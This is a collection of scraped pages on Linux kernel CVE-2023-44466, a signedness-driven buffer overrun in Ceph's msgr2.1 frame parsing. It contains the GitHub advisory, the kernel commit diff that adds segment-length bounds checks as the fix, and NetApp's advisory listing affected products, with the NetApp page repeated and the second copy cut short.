=== Content from github.com_1ad115f3_20250115_113245.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-7wwm-57j8-wx2j)

**CVE-2023-44466**

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%2FGHSA-7wwm-57j8-wx2j)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2Fadvisories%2F%3Cid%3E&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

1. [GitHub Advisory Database](/advisories)
2. [Unreviewed](/advisories?query=type%3Aunreviewed)
3. [CVE-2023-44466](/advisories/GHSA-7wwm-57j8-wx2j)

## An issue was discovered in net/ceph/messenger\_v2.c in the...

High severity

Unreviewed

Published
Sep 29, 2023
to the GitHub Advisory Database
•
Updated Nov 25, 2023

## Package

No package listed—
[Suggest a package](/advisories/GHSA-7wwm-57j8-wx2j/improve)

## Affected versions

Unknown

## Patched versions

Unknown

## Description

An issue was discovered in net/ceph/messenger\_v2.c in the Linux kernel before 6.4.5. There is an integer signedness error, leading to a buffer overflow and remote code execution via HELLO or one of the AUTH frames. This occurs because of an untrusted length taken from a TCP packet in ceph\_decode\_32.

### References

* [GHSA-jg27-jx6w-xwph](https://github.com/google/security-research/security/advisories/GHSA-jg27-jx6w-xwph "GHSA-jg27-jx6w-xwph")
* <https://nvd.nist.gov/vuln/detail/CVE-2023-44466>
* [torvalds/linux@a282a2f](https://github.com/torvalds/linux/commit/a282a2f10539dce2aa619e71e1817570d557fc97)
* <https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=a282a2f10539dce2aa619e71e1817570d557fc97>
* <https://www.spinics.net/lists/ceph-devel/msg57909.html>
* <https://security.netapp.com/advisory/ntap-20231116-0003/>

Published by the [National Vulnerability Database](https://nvd.nist.gov/vuln/detail/CVE-2023-44466)
Sep 29, 2023

Published to the GitHub Advisory Database
Sep 29, 2023

Last updated
Nov 25, 2023

### Severity

High

8.8

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
Low

User interaction
None

Scope
Unchanged

Confidentiality
High

Integrity
High

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

### [EPSS score](https://www.first.org/epss/user-guide)

0.421%
 (74th percentile)

### Weaknesses

[CWE-120](/advisories?query=cwe%3A120)

### CVE ID

CVE-2023-44466

### GHSA ID

GHSA-7wwm-57j8-wx2j

### Source code

No known source code

Dependabot alerts are not supported on this advisory because it does not have a package from a supported ecosystem with an affected and fixed version.

[Learn more about GitHub language support](https://docs.github.com/get-started/learning-about-github/github-language-support#about-supported-languages)

 Loading

Checking history

See something to contribute?
[Suggest improvements for this vulnerability](/advisories/GHSA-7wwm-57j8-wx2j/improve).

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from git.kernel.org_118278fe_20250114_185123.html ===


| [cgit logo](/) | [index](/) : [kernel/git/torvalds/linux.git](/pub/scm/linux/kernel/git/torvalds/linux.git/) | for-next master vsnprintf |
| --- | --- | --- |
| Linux kernel source tree | Linus Torvalds |

| [about](/pub/scm/linux/kernel/git/torvalds/linux.git/about/)[summary](/pub/scm/linux/kernel/git/torvalds/linux.git/)[refs](/pub/scm/linux/kernel/git/torvalds/linux.git/refs/?id=a282a2f10539dce2aa619e71e1817570d557fc97)[log](/pub/scm/linux/kernel/git/torvalds/linux.git/log/)[tree](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/?id=a282a2f10539dce2aa619e71e1817570d557fc97)[commit](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=a282a2f10539dce2aa619e71e1817570d557fc97)[diff](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=a282a2f10539dce2aa619e71e1817570d557fc97)[stats](/pub/scm/linux/kernel/git/torvalds/linux.git/stats/) | log msg author committer range |
| --- | --- |

**diff options**

|  | |
| --- | --- |
| context: | 12345678910152025303540 |
| space: | includeignore |
| mode: | unifiedssdiffstat only |
|  |  |

| author | Ilya Dryomov <idryomov@gmail.com> | 2023-07-10 20:39:29 +0200 |
| --- | --- | --- |
| committer | Ilya Dryomov <idryomov@gmail.com> | 2023-07-13 13:18:57 +0200 |
| commit | [a282a2f10539dce2aa619e71e1817570d557fc97](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=a282a2f10539dce2aa619e71e1817570d557fc97) ([patch](/pub/scm/linux/kernel/git/torvalds/linux.git/patch/?id=a282a2f10539dce2aa619e71e1817570d557fc97)) | |
| tree | [1fed5166a21680b0e1b02f74a18579b78086bdf9](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/?id=a282a2f10539dce2aa619e71e1817570d557fc97) | |
| parent | [06c2afb862f9da8dc5efa4b6076a0e48c3fbaaa5](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=06c2afb862f9da8dc5efa4b6076a0e48c3fbaaa5) ([diff](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=a282a2f10539dce2aa619e71e1817570d557fc97&id2=06c2afb862f9da8dc5efa4b6076a0e48c3fbaaa5)) | |
| download | [linux-a282a2f10539dce2aa619e71e1817570d557fc97.tar.gz](/pub/scm/linux/kernel/git/torvalds/linux.git/snapshot/linux-a282a2f10539dce2aa619e71e1817570d557fc97.tar.gz) | |

libceph: harden msgr2.1 frame segment length checksceph\_frame\_desc::fd\_lens is an int array. decode\_preamble() thus
effectively casts u32 -> int but the checks for segment lengths are
written as if on unsigned values. While reading in HELLO or one of the
AUTH frames (before authentication is completed), arithmetic in
head\_onwire\_len() can get duped by negative ctrl\_len and produce
head\_len which is less than CEPH\_PREAMBLE\_LEN but still positive.
This would lead to a buffer overrun in prepare\_read\_control() as the
preamble gets copied to the newly allocated buffer of size head\_len.
Cc: stable@vger.kernel.org
Fixes: cd1a677cad99 ("libceph, ceph: implement msgr2.1 protocol (crc and secure modes)")
Reported-by: Thelford Williams <thelford@google.com>
Signed-off-by: Ilya Dryomov <idryomov@gmail.com>
Reviewed-by: Xiubo Li <xiubli@redhat.com>
[Diffstat](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=a282a2f10539dce2aa619e71e1817570d557fc97)

| -rw-r--r-- | [net/ceph/messenger\_v2.c](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/net/ceph/messenger_v2.c?id=a282a2f10539dce2aa619e71e1817570d557fc97) | 41 | |  |  |  | | --- | --- | --- | |
| --- | --- | --- | --- | --- | --- | --- |

1 files changed, 26 insertions, 15 deletions

| diff --git a/net/ceph/messenger\_v2.c b/net/ceph/messenger\_v2.cindex 1a888b86a4948c..1df1d29dee920b 100644--- a/[net/ceph/messenger\_v2.c](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/ceph/messenger_v2.c?id=06c2afb862f9da8dc5efa4b6076a0e48c3fbaaa5)+++ b/[net/ceph/messenger\_v2.c](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/ceph/messenger_v2.c?id=a282a2f10539dce2aa619e71e1817570d557fc97)@@ -390,6 +390,8 @@ static int head\_onwire\_len(int ctrl\_len, bool secure) int head\_len; int rem\_len; + BUG\_ON(ctrl\_len < 0 || ctrl\_len > CEPH\_MSG\_MAX\_CONTROL\_LEN);+ if (secure) { head\_len = CEPH\_PREAMBLE\_SECURE\_LEN; if (ctrl\_len > CEPH\_PREAMBLE\_INLINE\_LEN) {@@ -408,6 +410,10 @@ static int head\_onwire\_len(int ctrl\_len, bool secure) static int \_\_tail\_onwire\_len(int front\_len, int middle\_len, int data\_len, bool secure) {+ BUG\_ON(front\_len < 0 || front\_len > CEPH\_MSG\_MAX\_FRONT\_LEN ||+ middle\_len < 0 || middle\_len > CEPH\_MSG\_MAX\_MIDDLE\_LEN ||+ data\_len < 0 || data\_len > CEPH\_MSG\_MAX\_DATA\_LEN);+ if (!front\_len && !middle\_len && !data\_len) return 0; @@ -520,29 +526,34 @@ static int decode\_preamble(void \*p, struct ceph\_frame\_desc \*desc) desc->fd\_aligns[i] = ceph\_decode\_16(&p); } - /\*- \* This would fire for FRAME\_TAG\_WAIT (it has one empty- \* segment), but we should never get it as client.- \*/- if (!desc->fd\_lens[desc->fd\_seg\_cnt - 1]) {- pr\_err("last segment empty\n");+ if (desc->fd\_lens[0] < 0 ||+ desc->fd\_lens[0] > CEPH\_MSG\_MAX\_CONTROL\_LEN) {+ pr\_err("bad control segment length %d\n", desc->fd\_lens[0]); return -EINVAL; }-- if (desc->fd\_lens[0] > CEPH\_MSG\_MAX\_CONTROL\_LEN) {- pr\_err("control segment too big %d\n", desc->fd\_lens[0]);+ if (desc->fd\_lens[1] < 0 ||+ desc->fd\_lens[1] > CEPH\_MSG\_MAX\_FRONT\_LEN) {+ pr\_err("bad front segment length %d\n", desc->fd\_lens[1]); return -EINVAL; }- if (desc->fd\_lens[1] > CEPH\_MSG\_MAX\_FRONT\_LEN) {- pr\_err("front segment too big %d\n", desc->fd\_lens[1]);+ if (desc->fd\_lens[2] < 0 ||+ desc->fd\_lens[2] > CEPH\_MSG\_MAX\_MIDDLE\_LEN) {+ pr\_err("bad middle segment length %d\n", desc->fd\_lens[2]); return -EINVAL; }- if (desc->fd\_lens[2] > CEPH\_MSG\_MAX\_MIDDLE\_LEN) {- pr\_err("middle segment too big %d\n", desc->fd\_lens[2]);+ if (desc->fd\_lens[3] < 0 ||+ desc->fd\_lens[3] > CEPH\_MSG\_MAX\_DATA\_LEN) {+ pr\_err("bad data segment length %d\n", desc->fd\_lens[3]); return -EINVAL; }- if (desc->fd\_lens[3] > CEPH\_MSG\_MAX\_DATA\_LEN) {- pr\_err("data segment too big %d\n", desc->fd\_lens[3]);++ /\*+ \* This would fire for FRAME\_TAG\_WAIT (it has one empty+ \* segment), but we should never get it as client.+ \*/+ if (!desc->fd\_lens[desc->fd\_seg\_cnt - 1]) {+ pr\_err("last segment empty, segment count %d\n",+ desc->fd\_seg\_cnt); return -EINVAL; } |
| --- |

generated by [cgit 1.2.3-korg](https://git.zx2c4.com/cgit/about/) ([git 2.43.0](https://git-scm.com/)) at 2025-01-14 18:50:01 +0000



=== Content from security.netapp.com_e3c4f45f_20250114_185127.html ===

[Skip to main content](#n-main-content)

* [NetApp.com](https://www.netapp.com/)
* [Support](https://mysupport.netapp.com)
* [Community](https://community.netapp.com)
* [Training](https://www.netapp.com/support-and-training/netapp-learning-services/)

* [Contact Us](https://www.netapp.com/company/contact-us/)

English
æ¥æ¬èª

[netapp-mark

NetApp

## Product Security](https://security.netapp.com)

Search

Search

* Search

Search

Search

* [Home](https://security.netapp.com/en)
* [Advisories](https://security.netapp.com/advisory/)
* [Bulletins](https://security.netapp.com/bulletins/)
* [Contact](https://security.netapp.com/contact/)
* [Policy](https://security.netapp.com/policy/)
* [Resources](https://security.netapp.com/resources/)
* [Certifications](https://security.netapp.com/certs/)

* [Home](https://security.netapp.com/en)
* [Advisory](https://security.netapp.com/advisory)
* [CVE-2023-44466 Linux Kernel Vulnerability in NetApp Products](https://security.netapp.com/advisory/ntap-20231116-0003)

## CVE-2023-44466 Linux Kernel Vulnerability in NetApp Products

circle-info

NetApp will continue to update this advisory as additional information becomes available.

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

close ×

#### Subscribe to NTAP-20231116-0003 updates

Email

Yes, please send me emails when NetApp Security Advisories are posted or updated.

 By filling and submitting this form, I understand and agree with the [NetApp privacy policy](https://www.netapp.com/company/legal/privacy-policy/ "Privacy Policy") and understand that I can unsubscribe from NetApp Security Advisory communications at any time.

Subscribe

#### Subscribe to NTAP-20231116-0003 advisory updates

OTP

Confirm

ionicons-v5-e

Confirmed your subscription to advisory alerts

close ×

#### Unsubscribe from NTAP-20231116-0003 advisory updates

Email

Unsubscribe

#### Unsubscribe from NTAP-20231116-0003 advisory updates

Email

Confirm

ionicons-v5-e

Unsubscribed successfully from advisory alerts

Subscribe to receive email updates

**Advisory ID:** NTAP-20231116-0003
**Version:**
7.0

**Last updated:**
10/22/2024

**Status:**
Interim.

**CVEs:** CVE-2023-44466

Overview
#### Summary

Multiple NetApp products incorporate Linux kernel. Linux kernel versions prior to 6.4.5 are susceptible to a vulnerability which when successfully exploited could lead to disclosure of sensitive information, addition or modification of data, or Denial of Service (DoS).

#### Impact

Successful exploitation of this vulnerability could lead to disclosure of sensitive information, addition or modification of data, or Denial of Service (DoS).

#### Vulnerability Scoring Details

| **CVE** | **Score** | **Vector** |
| --- | --- | --- |
| [CVE-2023-44466](https://nvd.nist.gov/vuln/detail/CVE-2023-44466) | 8.8 (HIGH) | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |

#### Exploitation and Public Announcements

NetApp is aware of public discussion of this vulnerability.

#### References

* <https://github.com/advisories/GHSA-7wwm-57j8-wx2j>

Affected Products
#### Affected Products

* NetApp HCI Baseboard Management Controller (BMC) - H300S/H500S/H700S/H410S
* NetApp SolidFire & HCI Management Node
* NetApp SolidFire & HCI Storage Node (Element Software)
* ONTAP Select Deploy administration utility

#### Products Under Investigation

* NetApp HCI Baseboard Management Controller (BMC) - H410C
* NetApp HCI Compute Node (Bootstrap OS)

#### Products Not Affected

* AFF BIOS - A700s
* AFF Baseboard Management Controller (BMC) - A700s
* ATTO FibreBridge - 7600N
* Active IQ Unified Manager for Linux
* Active IQ Unified Manager for Microsoft Windows
* Active IQ Unified Manager for VMware vSphere
* Active IQ mobile app
* Astra Control Center
* Astra Control Center - NetApp Kubernetes Monitoring Operator
* Astra Trident
* Astra Trident Autosupport
* BlueXP Classification
* Brocade Fabric Operating System Firmware
* Brocade SAN Navigator (SANnav)
* Cloud Volumes ONTAP Mediator
* Data Infrastructure Insights Acquisition Unit (formerly Cloud Insights Acquisition Unit)
* Data Infrastructure Insights Storage Workload Security Agent (formerly Cloud Insights Storage Workload Security Agent)
* Data Infrastructure Insights Telegraf Agent (formerly Cloud Insights Telegraf Agent)
* E-Series BIOS
* E-Series SANtricity OS Controller Software 11.x
* E-Series SANtricity Unified Manager and Web Services Proxy
* Element .NET SDK
* Element HealthTools
* Element JAVA SDK
* Element Plug-in for vCenter Server
* Element Powershell Tools
* Element Python SDK
* FAS/AFF BIOS - 2820
* FAS/AFF BIOS - 8300/8700/A400/C400
* FAS/AFF BIOS - A250/500f/C250
* FAS/AFF BIOS - A300/8200/C190/A220/2720/2750/A150
* FAS/AFF BIOS - A320
* FAS/AFF BIOS - A700/9000
* FAS/AFF BIOS - A800/C800
* FAS/AFF BIOS - A900/9500
* FAS/AFF Baseboard Management Controller (BMC) - 8300/8700/A400/C400
* FAS/AFF Baseboard Management Controller (BMC) - A250/500f/C250
* FAS/AFF Baseboard Management Controller (BMC) - A320
* FAS/AFF Baseboard Management Controller (BMC) - A800/C800
* FAS/AFF Baseboard Management Controller (BMC) - A900/9500
* FAS/AFF Baseboard Management Controller (BMC) - C190/A150/A220/FAS2720/FAS2750
* FAS/AFF Baseboard Management Controller (BMC) - FAS2820
* FAS/AFF Service Processor - A300/8200
* FAS/AFF Service Processor - A700/9000
* Global File Cache
* Host Utilities - SAN for Linux
* Host Utilities - SAN for Windows
* IOM12 SAS Disk Shelf Firmware
* IOM12B SAS Disk Shelf Firmware
* IOM12E SAS Disk Shelf Firmware
* IOM12F SAS Disk Shelf Firmware
* IOM12G SAS Disk Shelf Firmware
* IOM6 SAS Disk Shelf Firmware
* IOM6E SAS Disk Shelf Firmware
* Management Services for Element Software and NetApp HCI
* MetroCluster DataCollector
* MetroCluster Tiebreaker
* Multipath I/O (SANtricity DSM for Windows MPIO)
* NetApp BlueXP
* NetApp Converged Systems Advisor Agent
* NetApp E-Series Host Collection
* NetApp E-Series SANtricity Collection
* NetApp HCI Baseboard Management Controller (BMC) - H610C
* NetApp HCI Baseboard Management Controller (BMC) - H610S
* NetApp HCI Baseboard Management Controller (BMC) - H615C
* NetApp HCI Compute Node BIOS
* NetApp HCI Storage Node BIOS
* NetApp Kubernetes Monitoring Operator
* NetApp Manageability SDK
* NetApp NFS Plug-in for VMware VAAI
* NetApp ONTAP PowerShell Toolkit (PSTK)
* NetApp SolidFire Plug-in for vRealize Orchestrator (SolidFire vRO)
* NetApp XCP NFS
* NetApp XCP SMB
* ONTAP 9
* ONTAP Antivirus Connector
* ONTAP Mediator
* ONTAP tools for VMware vSphere 9
* OnCommand Insight
* OnCommand Workflow Automation
* RcfFileGenerator for MetroCluster IP
* SANtricity Storage Plugin for vCenter
* SRA Plugin for Linux
* SRA Plugin for Windows
* Single Mailbox Recovery
* Snap Creator Framework
* SnapCenter
* SnapCenter Plug-in for VMware vSphere/BlueXP backup and Recovery for Virtual Machine
* SnapGathers
* SnapManager for Hyper-V
* SolidFire Storage Replication Adapter
* StorageGRID (formerly StorageGRID Webscale)
* StorageGRID BIOS SG1000/SG100/SG1100/SG110
* StorageGRID BIOS SG5660/SG5612/SG5760/SG5712
* StorageGRID BIOS SG6060/SGF6024/SGF6112/SG6160
* StorageGRID Baseboard Management Controller (BMC) - SG6060/SG6160/SGF6024/SGF6112/SG100/SG110/SG1000/SG1100
* System Manager 9.x

Remediation
#### Software Versions and Fixes

NetApp's currently available patches are listed below.

| **Product** | **First Fixed in Release** |
| --- | --- |
| **NetApp HCI Baseboard Management Controller (BMC) - H300S/H500S/H700S/H410S** | NetApp HCI Baseboard Management Controller (BMC) - H300S/H500S/H700S/H410S has no plans to address this vulnerability. See the [EOA announcement](https://mysupport.netapp.com/info/communications/ECMLP2876227.html) for more information. |

#### Workarounds

None at this time.

#### Obtaining Software Fixes

Software fixes will be made available through the NetApp Support website in the Software Download section.

<https://mysupport.netapp.com/site/downloads/>

Customers who do not have access to the Support website should contact Technical Support at the number below to obtain the patches.

#### Contact Information

Check <http://mysupport.netapp.com> for further
updates.

**Technical Support**

Revision History
#### Status of This Notice

**Interim.**

NetApp will continue to update this advisory as additional information becomes available.

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

This advisory is posted at the following link:

<https://security.netapp.com/advisory/NTAP-20231116-0003>
#### Revision History

| **Revision #** | **Date** | **Comments** |
| --- | --- | --- |
| 1.0 | 20231116 | Initial Public Release |
| 2.0 | 20231130 | NetApp HCI Baseboard Management Controller (BMC) - H615C, NetApp HCI Baseboard Management Controller (BMC) - H610C, and NetApp HCI Baseboard Management Controller (BMC) - H610S moved to Products Not Affected, NetApp SolidFire & HCI Management Node and NetApp SolidFire & HCI Storage Node (Element Software) moved to Affected Products |
| 3.0 | 20231208 | SnapCenter Plug-in for VMware vSphere/BlueXP backup and Recovery for Virtual Machine moved to Products Not Affected |
| 4.0 | 20231214 | Brocade Fabric Operating System Firmware moved to Products Not Affected |
| 5.0 | 20240415 | NetApp HCI Baseboard Management Controller (BMC) - H300S/H500S/H700S/H410S moved to Won't Fix status |
| 6.0 | 20241014 | ONTAP Select Deploy administration utility moved to Affected Products |
| 7.0 | 20241022 | AFF Baseboard Management Controller (BMC) - A700s moved to Products Not Affected |

This document is provided solely for informational purposes. All information is based upon NetAppâs current knowledge and understanding of the hardware and software products tested by NetApp, and the methodology and assumptions used by NetApp. NetApp is not responsible for any errors or omissions that may be contained herein, and no warranty, representation, or other legal commitment or obligation is being provided by NetApp. Â© 2025 NetApp, Inc. All rights reserved. No portions of this document may be reproduced without prior written consent of NetApp, Inc.

 ©  NetApp

Have feedback for our website?
[Let us know](https://www.netapp.com/forms/site-feedback/)



=== Content from security.netapp.com_4ce19b17_20250115_113245.html ===

[Skip to main content](#n-main-content)

* [NetApp.com](https://www.netapp.com/)
* [Support](https://mysupport.netapp.com)
* [Community](https://community.netapp.com)
* [Training](https://www.netapp.com/support-and-training/netapp-learning-services/)

* [Contact Us](https://www.netapp.com/company/contact-us/)

English
æ¥æ¬èª

[netapp-mark

NetApp

## Product Security](https://security.netapp.com)

Search

Search

* Search

Search

Search

* [Home](https://security.netapp.com/en)
* [Advisories](https://security.netapp.com/advisory/)
* [Bulletins](https://security.netapp.com/bulletins/)
* [Contact](https://security.netapp.com/contact/)
* [Policy](https://security.netapp.com/policy/)
* [Resources](https://security.netapp.com/resources/)
* [Certifications](https://security.netapp.com/certs/)

* [Home](https://security.netapp.com/en)
* [Advisory](https://security.netapp.com/advisory)
* [CVE-2023-44466 Linux Kernel Vulnerability in NetApp Products](https://security.netapp.com/advisory/ntap-20231116-0003)

## CVE-2023-44466 Linux Kernel Vulnerability in NetApp Products

circle-info

NetApp will continue to update this advisory as additional information becomes available.

This advisory should be considered the single source of current, up-to-date, authorized and accurate information from NetApp regarding Full Support products and versions.

close ×

#### Subscribe to NTAP-20231116-0003 updates

Email

Yes, please send me emails when NetApp Security Advisories are posted or updated.

 By filling and submitting this form, I understand and agree with the [NetApp privacy policy](https://www.netapp.com/company/legal/privacy-policy/ "Privacy Policy") and understand that I can unsubscribe from NetApp Security Advisory communications at any time.

Subscribe

#### Subscribe to NTAP-20231116-0003 advisory updates

OTP

Confirm

ionicons-v5-e

Confirmed your subscription to advisory alerts

close ×

#### Unsubscribe from NTAP-20231116-0003 advisory updates

Email

Unsubscribe

#### Unsubscribe from NTAP-20231116-0003 advisory updates

Email

Confirm

ionicons-v5-e

Unsubscribed successfully from advisory alerts

Subscribe to receive email updates

**Advisory ID:** NTAP-20231116-0003
**Version:**
7.0

**Last updated:**
10/22/2024

**Status:**
Interim.

**CVEs:** CVE-2023-44466

Overview
#### Summary

Multiple NetApp products incorporate Linux kernel. Linux kernel versions prior to 6.4.5 are susceptible to a vulnerability which when successfully exploited could lead to disclosure of sensitive information, addition or modification of data, or Denial of Service (DoS).

#### Impact

Successful exploitation of this vulnerability could lead to disclosure of sensitive information, addition or modification of data, or Denial of Service (DoS).

#### Vulnerability Scoring Details

| **CVE** | **Score** | **Vector** |
| --- | --- | --- |
| [CVE-2023-44466](https://nvd.nist.gov/vuln/detail/CVE-2023-44466) | 8.8 (HIGH) | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H |

#### Exploitation and Public Announcements

NetApp is aware of public discussion of this vulnerability.

#### References

* <https://github.com/advisories/GHSA-7wwm-57j8-wx2j>

Affected Products
#### Affected Products

* NetApp HCI Baseboard Management Controller (BMC) - H300S/H500S/H700S/H410S
* NetApp SolidFire & HCI Management Node
* NetApp SolidFire & HCI Storage Node (Element Software)
* ONTAP Select Deploy administration utility

#### Products Under Investigation

* NetApp HCI Baseboard Management Controller (BMC) - H410C
* NetApp HCI Compute Node (Bootstrap OS)

#### Products Not Affected

* AFF BIOS - A700s
* AFF Baseboard Management Controller (BMC) - A700s
* ATTO FibreBridge - 7600N
* Active IQ Unified Manager for Linux
* Active IQ Unified Manager for Microsoft Windows
* Active IQ Unified Manager for VMware vSphere
* Active IQ mobile app
* Astra Control Center
* Astra Control Center - NetApp Kubernetes Monitoring Operator
* Astra Trident
* Astra Trident Autosupport
* BlueXP Classification
* Brocade Fabric Operating System Firmware
* Brocade SAN Navigator (SANnav)
* Cloud Volumes ONTAP Mediator
* Data Infrastructure Insights Acquisition Unit (formerly Cloud Insights Acquisition Unit)
* Data Infrastructure Insights Storage Workload Security Agent (formerly Cloud Insights Storage Workload Security Agent)
* Data Infrastructure Insights Telegraf Agent (formerly Cloud Insights Telegraf Agent)
* E-Series BIOS
* E-Series SANtricity OS Controller Software 11.x
* E-Series SANtricity Unified Manager and Web Services Proxy
* Element .NET SDK
* Element HealthTools
* Element JAVA SDK
* Element Plug-in for vCenter Server
* Element Powershell Tools
* Element Python SDK
* FAS/AFF BIOS - 2820
* FAS/AFF BIOS - 8300/8700/A400/C400
* FAS/AFF BIOS - A250/500f/C250
* FAS/AFF BIOS - A300/8200/C190/A220/2720/2750/A150
* FAS/AFF BIOS - A320
* FAS/AFF BIOS - A700/9000
* FAS/AFF BIOS - A800/C800
* FAS/AFF BIOS - A900/9500
* FAS/AFF Baseboard Management Controller (BMC) - 8300/8700/A400/C400
* FAS/AFF Baseboard Management Controller (BMC) - A250/500f/C250
* FAS/AFF Baseboard Management Controller (BMC) - A320
* FAS/AFF Baseboard Management Controller (BMC) - A800/C800
* FAS/AFF Baseboard Management Controller (BMC) - A900/9500
* FAS/AFF Baseboard Management Controller (BMC) - C190/A150/A220/FAS2720/FAS2750
* FAS/AFF Baseboard Management Controller (BMC) - FAS2820
* FAS/AFF Service Processor - A300/8200
* FAS/AFF Service Processor - A700/9000
* Global File Cache
* Host Utilities - SAN for Linux
* Host Utilities - SAN for Windows
* IOM12 SAS Disk Shelf Firmware
* IOM12B SAS Disk Shelf Firmware
* IOM12E SAS Disk Shelf Firmware
* IOM12F SAS Disk Shelf Firmware
* IOM12G SAS Disk Shelf Firmware
* IOM6 SAS Disk Shelf Firmware
* IOM6E SAS Disk Shelf Firmware
* Management Services for Element Software and NetApp HCI
* MetroCluster DataCollector
* MetroCluster Tiebreaker
* Multipath I/O (SANtricity DSM for Windows MPIO)
* NetApp BlueXP
* NetApp Converged Systems Advisor Agent
* NetApp E-Series Host Collection
* NetApp E-Series SANtricity Collection
* NetApp HCI Baseboard Management Controller (BMC) - H610C
* NetApp HCI Baseboard Management Controller (BMC) - H610S
* NetApp HCI Baseboard Management Controller (BMC) - H615C
* NetApp HCI Compute Node BIOS
* NetApp HCI Storage Node BIOS
* NetApp Kubernetes Monitoring Operator
* NetApp Manageability SDK
* NetApp NFS Plug-in for VMware VAAI
* NetApp ONTAP PowerShell Toolkit (PSTK)
* NetApp SolidFire Plug-in for vRealize Orchestrator (SolidFire vRO)
* NetApp XCP NFS
* NetApp XCP SMB
* ONTAP 9
* ONTAP Antivirus Connector
* ONTAP Mediator
* ONTAP tools for VMware vSphere 9
* OnCommand Insight
* OnCommand Workflow Automation
* RcfFileGenerator for MetroCluster IP
* SANtricity Storage Plugin for vCenter
